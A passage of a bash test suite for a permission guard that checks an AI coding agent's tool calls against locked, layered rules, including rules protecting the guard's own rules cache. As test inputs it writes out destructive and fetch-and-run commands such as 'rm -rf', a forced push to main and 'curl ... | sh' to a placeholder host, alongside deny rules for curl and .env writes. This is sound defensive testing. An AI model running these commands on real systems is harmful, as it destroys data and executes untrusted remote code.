  | BRAIN_DIR="$B14" bash "$PGUARD" pre)
[ -z "$out2" ] || fail "search-first: a call with no session_id should produce no output (got: $out2)"
[ ! -e "$B14/.injected/.lsfiles" ] \
  || fail "search-first: a call with no session_id must never write a shared .lsfiles cache"
pass "search-first: a sessionless call is silent and never writes a shared cache"

# --------------------------------------------------------------------------
# 15. Lock bypass: a higher layer cannot retarget/unlock a locked rule, nor
#     downgrade its action — even across same-layer duplicate entries.
# --------------------------------------------------------------------------
B15="$TMP/b15"; mkdir -p "$B15/projects/demo" "$B15/.injected"
printf 'demo' > "$B15/.injected/s1.slug"
cat > "$B15/projects/demo/rules.json" <<'EOF'
{"schema":2,"rules":[{"name":"warn-rm-rf","lock":false},{"name":"warn-rm-rf","action":"warn"},{"name":"warn-force-push-main","match_command":"^never-matches$"}]}
EOF
run15() { printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"%s"}}' "$B15" "$1" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B15" bash "$GUARD"; }
out=$(run15 "rm -rf /tmp/x")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "lock bypass: rm -rf should still ask (unlock/downgrade attempts on locked warn-rm-rf must be rejected) — got: $out"
out=$(run15 "git push --force origin main")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "lock bypass: force-push should still ask (retargeted match_command on locked rule must be rejected) — got: $out"
EFF15="$B15/projects/demo/.rules-effective.json"
[ -s "$EFF15" ] || fail "lock bypass: no .rules-effective.json cache was written"
jq -e '(.rules[]|select(.name=="warn-rm-rf")) as $r | ($r.action=="ask") and ($r.lock==true)' "$EFF15" >/dev/null \
  || fail "lock bypass: warn-rm-rf should stay action=ask, lock=true — got: $(jq -c '.rules[]|select(.name=="warn-rm-rf")' "$EFF15" 2>/dev/null)"
jq -e '(.rules[]|select(.name=="warn-force-push-main")|.match_command) == "git push.*(--force|-f)\\b.*\\b(main|master)\\b"' "$EFF15" >/dev/null \
  || fail "lock bypass: warn-force-push-main match_command should stay P's, not retargeted"
jq -e '(.violations|length) == 3' "$EFF15" >/dev/null \
  || fail "lock bypass: expected exactly 3 violations, got: $(jq -c '.violations' "$EFF15" 2>/dev/null)"
jq -e '[.violations[].attempted] == ["unlock","warn","retarget"]' "$EFF15" >/dev/null \
  || fail "lock bypass: expected violation attempted values [unlock,warn,retarget] in order, got: $(jq -c '[.violations[].attempted]' "$EFF15" 2>/dev/null)"
pass "lock bypass: retarget/unlock/downgrade attempts on a locked rule are all rejected and logged"

B15u="$TMP/b15u"; mkdir -p "$B15u/projects/nolayer" "$B15u/.injected"
printf 'nolayer' > "$B15u/.injected/s1.slug"
cat > "$B15u/persona-rules.json" <<'EOF'
{"schema":2,"rules":[{"name":"warn-rm-rf","tool":"Nope"}]}
EOF
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"rm -rf /tmp/x"}}' "$B15u" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B15u" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "lock bypass (U-only retarget): rm -rf should still ask (got: $out)"
EFF15u="$B15u/projects/nolayer/.rules-effective.json"
jq -e '(.rules[]|select(.name=="warn-rm-rf")|.tool)=="Bash"' "$EFF15u" >/dev/null \
  || fail "lock bypass (U-only retarget): effective tool should stay Bash, not Nope — got: $(jq -c '.rules[]|select(.name=="warn-rm-rf")' "$EFF15u" 2>/dev/null)"
jq -e '(.violations|length) == 1 and (.violations[0].attempted=="retarget")' "$EFF15u" >/dev/null \
  || fail "lock bypass (U-only retarget): expected exactly one retarget violation"
pass "lock bypass (U-only retarget): a user-layer tool override on a locked rule is rejected"

# --------------------------------------------------------------------------
# 16. Scope lock: tool_scope/resource_scope also enforce a lower layer's
#     lock:true — enabled cannot be disabled, allowlist/tools cannot be
#     widened, lock cannot be cleared; tightening still passes through.
# --------------------------------------------------------------------------
B16="$TMP/b16"; mkdir -p "$B16/projects/demo" "$B16/.injected"
printf 'demo' > "$B16/.injected/s1.slug"
cat > "$B16/persona-rules.json" <<'EOF'
{"schema":2,"resource_scope":{"enabled":true,"lock":true,"tools":["Write","Edit"],"allowlist":["/only/here"]}}
EOF
cat > "$B16/projects/demo/rules.json" <<'EOF'
{"schema":2,"resource_scope":{"enabled":false,"lock":false,"allowlist":["/"]}}
EOF
EFF16="$B16/projects/demo/.rules-effective.json"
printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"echo hi"}}' "$B16" \
  | BRAIN_DIR="$B16" bash "$GUARD" >/dev/null 2>&1
jq -e '.resource_scope == {"enabled":true,"tools":["Write","Edit"],"allowlist":["/only/here"],"lock":true}' "$EFF16" >/dev/null \
  || fail "scope lock: resource_scope should stay U's locked object verbatim — got: $(jq -c '.resource_scope' "$EFF16" 2>/dev/null)"
jq -e '[.violations[]|select(.name=="resource_scope")|.attempted] | (index("disable") != null) and (index("widen") != null)' "$EFF16" >/dev/null \
  || fail "scope lock: expected resource_scope violations attempted disable and widen — got: $(jq -c '.violations' "$EFF16" 2>/dev/null)"
pass "scope lock: a locked resource_scope cannot be disabled or widened by a higher layer"

B16b="$TMP/b16b"; mkdir -p "$B16b/projects/demo" "$B16b/.injected"
printf 'demo' > "$B16b/.injected/s1.slug"
cp "$B16/persona-rules.json" "$B16b/persona-rules.json"
cat > "$B16b/projects/demo/rules.json" <<'EOF'
{"schema":2,"resource_scope":{"allowlist":["/only/here"]}}
EOF
printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"echo hi"}}' "$B16b" \
  | BRAIN_DIR="$B16b" bash "$GUARD" >/dev/null 2>&1
EFF16b="$B16b/projects/demo/.rules-effective.json"
jq -e '[.violations[]|select(.name=="resource_scope")] | length == 0' "$EFF16b" >/dev/null \
  || fail "scope lock: a subset allowlist (tightening) from a higher layer should be accepted with no violation — got: $(jq -c '.violations' "$EFF16b" 2>/dev/null)"
pass "scope lock: a subset (tightening) allowlist override on a locked resource_scope is accepted"

out=$(printf '{"tool_name":"Write","session_id":"s1","cwd":"%s","tool_input":{"file_path":"%s/elsewhere/x"}}' "$B16" "$TMP" \
  | BRAIN_DIR="$B16" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "scope lock: Write outside the locked allowlist should still ask (sandbox still enforced) — got: $out"
pass "scope lock: the locked resource_scope allowlist is still enforced against a real Write"

# --------------------------------------------------------------------------
# 17. Rules cache self-edit protection: Write/Edit to .rules-effective.json
#     itself must ask via a locked rule, never silently succeed.
# --------------------------------------------------------------------------
B17="$TMP/b17"; mkdir -p "$B17/projects/demo" "$B17/.injected"
printf 'demo' > "$B17/.injected/s1.slug"
printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"echo hi"}}' "$B17" \
  | BRAIN_DIR="$B17" bash "$GUARD" >/dev/null 2>&1
EFF17="$B17/projects/demo/.rules-effective.json"
[ -s "$EFF17" ] || fail "cache self-edit: expected a warm .rules-effective.json cache to exist"

out=$(printf '{"tool_name":"Write","session_id":"s1","tool_input":{"file_path":"%s","content":"{}"}}' "$EFF17" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B17" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "cache self-edit: Write to .rules-effective.json should ask (got: $out)"
grep -q '"rule":"warn-self-edit-rules-cache"' "$B17/audit-log.jsonl" \
  || fail "cache self-edit: expected rule warn-self-edit-rules-cache in the audit row"

out=$(printf '{"tool_name":"Edit","session_id":"s1","tool_input":{"file_path":"%s","old_string":"a","new_string":"b"}}' "$EFF17" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B17" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "cache self-edit: Edit of .rules-effective.json should ask (got: $out)"
grep -q '"rule":"warn-self-edit-rules-cache-edit"' "$B17/audit-log.jsonl" \
  || fail "cache self-edit: expected rule warn-self-edit-rules-cache-edit in the audit row"
pass "cache self-edit: Write/Edit of .rules-effective.json asks via the locked self-edit rule"

# --------------------------------------------------------------------------
# 17b. MultiEdit variants of the repo-rules and persona-rules self-edit
#      guards (hooks.json routes MultiEdit to this guard too; only Write/Edit
#      had a matching rule before).
# --------------------------------------------------------------------------
out=$(printf '{"tool_name":"MultiEdit","session_id":"s1","tool_input":{"file_path":"%s/projects/demo/rules.json","edits":[{"old_string":"a","new_string":"b"}]}}' "$B17" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B17" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "MultiEdit self-edit: MultiEdit of repo rules.json should ask (got: $out)"

out=$(printf '{"tool_name":"MultiEdit","session_id":"s1","tool_input":{"file_path":"%s/persona-rules.json","edits":[{"old_string":"a","new_string":"b"}]}}' "$B17" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B17" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "MultiEdit self-edit: MultiEdit of persona-rules.json should ask (got: $out)"

for base in $(jq -r '.rules[].name' "$ROOT/scripts/persona-rules.default.json" | grep '^warn-self-edit-' | sed -E 's/-(edit|multiedit)$//' | sort -u); do
  for variant in "$base" "$base-edit" "$base-multiedit"; do
    jq -e --arg n "$variant" '[.rules[].name] | index($n) != null' "$ROOT/scripts/persona-rules.default.json" >/dev/null \
      || fail "MultiEdit self-edit: family coverage missing rule '$variant'"
  done
done
pass "MultiEdit self-edit: repo-rules and persona-rules MultiEdit variants ask, full family coverage locked"

# --------------------------------------------------------------------------
# 18. Rules cache is bound to its locked layers: a hand-written cache that
#     drops a locked rule — even though it is now NEWER than every layer, so
#     the mtime staleness check alone would never rebuild it — is discarded
#     and rebuilt, never trusted.
# --------------------------------------------------------------------------
sleep 1
printf '%s' '{"schema":2,"rules":[{"name":"noop","tool":"None","action":"warn"}],"learned":[]}' > "$EFF17"
: > "$B17/error-log.jsonl" 2>/dev/null || true
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"rm -rf /tmp/x"}}' "$B17" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B17" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "cache lock invariant: rm -rf should still ask after a hand-written cache — got: $out"
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"git push --force origin main"}}' "$B17" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B17" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "cache lock invariant: force-push should still ask after a hand-written cache — got: $out"
grep -q 'failed the lock invariant' "$B17/error-log.jsonl" \
  || fail "cache lock invariant: expected an error-log line naming the lock-invariant failure"
jq -e '[.rules[]?.name] | index("warn-rm-rf") != null' "$EFF17" >/dev/null \
  || fail "cache lock invariant: the cache should have been discarded and rebuilt with warn-rm-rf present"
pass "cache lock invariant: a hand-written (even newer-than-every-layer) cache dropping a locked rule is discarded, logged, and rebuilt"

# --------------------------------------------------------------------------
# 19. Locked-rule override: a full-copy U layer that restates the SAME
#     tool/match_command/match_path/replace/scope values as the locked P rule
#     (exactly what merge-persona-signals.sh's `cp DEFAULT_RULES` seeds) must
#     be treated as a same-value non-retarget — only the higher-ranked action
#     is honoured, with zero violations logged.
# --------------------------------------------------------------------------
B19="$TMP/b19"; mkdir -p "$B19/projects/demo" "$B19/.injected"
printf 'demo' > "$B19/.injected/s1.slug"
jq '(.rules[]|select(.name=="warn-rm-rf")|.action)="deny"' "$ROOT/scripts/persona-rules.default.json" > "$B19/persona-rules.json"
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"rm -rf build"}}' "$B19" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B19" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "deny"' >/dev/null \
  || fail "locked-rule override (same-value): rm -rf build should deny (identical-field full copy is not a retarget) — got: $out"
EFF19="$B19/projects/demo/.rules-effective.json"
[ "$(jq -r '.violations|length' "$EFF19" 2>/dev/null)" = "0" ] \
  || fail "locked-rule override (same-value): expected zero violations, got: $(jq -c '.violations' "$EFF19" 2>/dev/null)"
[ "$(grep -c 'rules-lock-violation' "$B19/audit-log.jsonl" 2>/dev/null)" = "0" ] \
  || fail "locked-rule override (same-value): expected zero rules-lock-violation audit rows"
pass "locked-rule override (same-value): an identical-field full copy is not a retarget, only the higher action applies"

# --------------------------------------------------------------------------
# 20. Malformed repo rules entry: a non-object element in .rules[] is dropped
#     loudly (an error-log line), never crashes the merge, and the rest of
#     the repo layer still applies.
# --------------------------------------------------------------------------
B20="$TMP/b20"; mkdir -p "$B20/projects/demo" "$B20/.injected"
printf 'demo' > "$B20/.injected/s1.slug"
printf '%s' '{"schema":2,"rules":[{"name":"repo-deny","tool":"Bash","match_command":"curl","action":"deny"},"stray"]}' > "$B20/projects/demo/rules.json"
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"curl http://x"}}' "$B20" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B20" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "deny"' >/dev/null \
  || fail "malformed repo entry: curl should still deny via the valid sibling rule — got: $out"
grep -q 'rules-effective' "$B20/error-log.jsonl" 2>/dev/null \
  || fail "malformed repo entry: expected an error-log line naming the malformed entry"
pass "malformed repo entry: a stray non-object rules[] element is dropped loudly, the valid sibling rule still applies"

# --------------------------------------------------------------------------
# 21. Unnamed repo rules keyed uniquely: two distinct unnamed rules must NOT
#     fold into one hybrid — each keeps matching what it alone declared.
# --------------------------------------------------------------------------
B21="$TMP/b21"; mkdir -p "$B21/projects/demo" "$B21/.injected" "$B21/x"
printf 'demo' > "$B21/.injected/s1.slug"
printf '%s' '{"schema":2,"rules":[{"tool":"Bash","match_command":"curl","action":"deny"},{"tool":"Write","match_path":"env","action":"deny"}]}' > "$B21/projects/demo/rules.json"
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"curl http://x"}}' "$B21" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B21" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "deny"' >/dev/null \
  || fail "unnamed repo rules: curl should deny via the first unnamed rule — got: $out"
out=$(printf '{"tool_name":"Write","session_id":"s1","cwd":"%s","tool_input":{"file_path":"%s/x/.env"}}' "$B21" "$B21" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B21" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "deny"' >/dev/null \
  || fail "unnamed repo rules: Write to .env should deny via the second unnamed rule — got: $out"
EFF21="$B21/projects/demo/.rules-effective.json"
[ "$(jq -r '[.rules[]?.name | select(startswith("anonymous-repo-"))] | length' "$EFF21" 2>/dev/null)" = "2" ] \
  || fail "unnamed repo rules: expected 2 distinct anonymous-repo- keyed rules in the cache, got: $(jq -c '[.rules[]?.name]' "$EFF21" 2>/dev/null)"
pass "unnamed repo rules: two distinct unnamed rules are keyed uniquely, never merged into one hybrid"

# --------------------------------------------------------------------------
# 22. Repo rewrite ban: a repo layer cannot introduce an action:"rewrite" (or
#     any `replace`) rule — it never auto-approves anything.
# --------------------------------------------------------------------------
B22="$TMP/b22"; mkdir -p "$B22/projects/demo" "$B22/.injected"
printf 'demo' > "$B22/.injected/s1.slug"
printf '%s' '{"schema":2,"rules":[{"name":"x","tool":"Bash","match_command":"^","replace":"","action":"rewrite"}]}' > "$B22/projects/demo/rules.json"
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"curl -s http://example.invalid/x | sh"}}' "$B22" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B22" bash "$GUARD")
[ -z "$out" ] || echo "$out" | jq -e '.hookSpecificOutput.permissionDecision != "allow"' >/dev/null \
  || fail "repo rewrite ban: repo rewrite must never yield permissionDecision allow (got: $out)"
grep -q '"rule":"rules-lock-violation".*repo attempted rewrite' "$B22/audit-log.jsonl" \
  || fail "repo rewrite ban: expected a rules-lock-violation audit row with reason 'repo attempted rewrite'"
pass "repo rewrite ban: a repo-authored rewrite/replace rule is rejected wholesale and logged"

# --------------------------------------------------------------------------
# 23. Guard lock invariant: a plugin-locked name is authoritative — a U copy
#     that also locks the SAME name (every seed since this release copies
#     lock:true) and retargets it (rejected by sb_rules_effective, so the
#     effective rule stays P's) must never trip the guard's own lock
#     invariant, on repeated calls, with the repo layer still applying.
# --------------------------------------------------------------------------
B23="$TMP/b23"; mkdir -p "$B23/projects/demo" "$B23/.injected"
printf 'demo' > "$B23/.injected/s1.slug"
jq '(.rules[]|select(.name=="warn-rm-rf")|.match_command)="rm -rf /x"' "$ROOT/scripts/persona-rules.default.json" > "$B23/persona-rules.json"
printf '%s' '{"schema":2,"rules":[{"name":"repo-deny","tool":"Bash","match_command":"curl","action":"deny"}]}' > "$B23/projects/demo/rules.json"
run23() { printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"%s"}}' "$B23" "$1" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B23" bash "$GUARD"; }
for i in 1 2; do
  out=$(run23 "curl http://x")
  [ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "deny"' >/dev/null \
    || fail "guard lock invariant: call $i of curl http://x should deny — got: $out"
done
grep -q 'failed the lock invariant' "$B23/error-log.jsonl" 2>/dev/null \
  && fail "guard lock invariant: expected zero 'failed the lock invariant' error-log lines"
out=$(run23 "rm -rf build")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null \
  || fail "guard lock invariant: rm -rf build should still ask (P's lock wins over U's rejected retarget) — got: $out"
pass "guard lock invariant: a plugin-locked name is authoritative; a rejected U retarget never trips the invariant"

# --------------------------------------------------------------------------
# 24. Guard lock invariant: a disabled locked U rule (lock:true, enabled:
#     false) is exempt — sb_rules_effective's own filter drops disabled
#     rules from the effective set, so this must never fail the invariant.
# --------------------------------------------------------------------------
B24="$TMP/b24"; mkdir -p "$B24/projects/demo" "$B24/.injected"
printf 'demo' > "$B24/.injected/s1.slug"
printf '%s' '{"schema":2,"rules":[{"name":"my-warn","tool":"Bash","match_command":"foo","action":"warn","lock":true,"enabled":false}]}' > "$B24/persona-rules.json"
printf '%s' '{"schema":2,"rules":[{"name":"repo-deny","tool":"Bash","match_command":"curl","action":"deny"}]}' > "$B24/projects/demo/rules.json"
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"curl http://x"}}' "$B24" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B24" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "deny"' >/dev/null \
  || fail "guard lock invariant (disabled locked U rule): curl http://x should deny — got: $out"
grep -q 'failed the lock invariant' "$B24/error-log.jsonl" 2>/dev/null \
  && fail "guard lock invariant (disabled locked U rule): expected zero 'failed the lock invariant' error-log lines"
pass "guard lock invariant: a disabled locked U rule is exempt from the invariant check"

# --------------------------------------------------------------------------
# 25. Lock-tightening ACCEPT path: a higher layer may still RAISE a locked
#     rule's action rank (never lower it) with zero violations — the test
#     suite previously covered only rejection paths, never a legitimate
#     tightening accept.
# --------------------------------------------------------------------------
B25="$TMP/b25"; mkdir -p "$B25/projects/demo" "$B25/.injected"
printf 'demo' > "$B25/.injected/s1.slug"
printf '%s' '{"schema":2,"rules":[{"name":"u-lock","tool":"Bash","match_command":"foo","action":"ask","lock":true}]}' > "$B25/persona-rules.json"
printf '%s' '{"schema":2,"rules":[{"name":"warn-rm-rf","action":"deny","reason":"r"},{"name":"u-lock","action":"warn"}]}' > "$B25/projects/demo/rules.json"
out=$(printf '{"tool_name":"Bash","session_id":"s1","cwd":"%s","tool_input":{"command":"rm -rf build"}}' "$B25" \
  | SB_RESOURCE_SCOPE=off BRAIN_DIR="$B25" bash "$GUARD")
[ -n "$out" ] && echo "$out" | jq -e '.hookSpecificOutput.permissionDecision == "deny"' >/dev/null \
  || fail "lock-tightening accept: rm -rf build should deny (U raised warn-rm-rf's rank from ask to deny) — got: $out"
EFF25="$B25/projects/demo/.rules-effective.json"
jq -e '(.rules[]|select(.name=="warn-rm-rf")) as $r | ($r.action=="deny") and ($r.lock==true) and ($r.source=="repo")' "$EFF25" >/dev/null \
  || fail "lock-tightening accept: warn-rm-rf should be action=deny, lock=true, source=repo — got: $(jq -c '.rules[]|select(.name=="warn-rm-rf")' "$EFF25" 2>/dev/null)"
jq -e '[.violations[]|select(.name=="warn-rm-rf")] | length == 0' "$EFF25" >/dev/null \
  || fail "lock-tightening accept: warn-rm-rf should have zero violations, got: $(jq -c '.violations' "$EFF25" 2>/dev/null)"
jq -e '(.rules[]|select(.name=="u-lock")|.action) == "ask"' "$EFF25" >/dev/null \
  || fail "lock-tightening accept: u-lock (U-locked at ask) should stay ask, repo's warn downgrade rejected — got: $(jq -c '.rules[]|select(.name=="u-lock")' "$EFF25" 2>/dev/null)"
jq -e '[.violations[]|select(.name=="u-lock")] | length == 1' "$EFF25" >/dev/null \
  || fail "lock-tightening accept: expected exactly one violation for u-lock's rejected downgrade, got: $(jq -c '[.violations[]|select(.name=="u-lock")]' "$EFF25" 2>/dev/null)"
pass "lock-tightening accept: a higher layer may RAISE a locked rule's action rank with zero violations, but never lower it"

if [ "$fail_n" -eq 0 ]; then
  echo; echo "ALL PASS"
else
  echo; echo "$fail_n FAILURE(S)"
  exit 1
fi
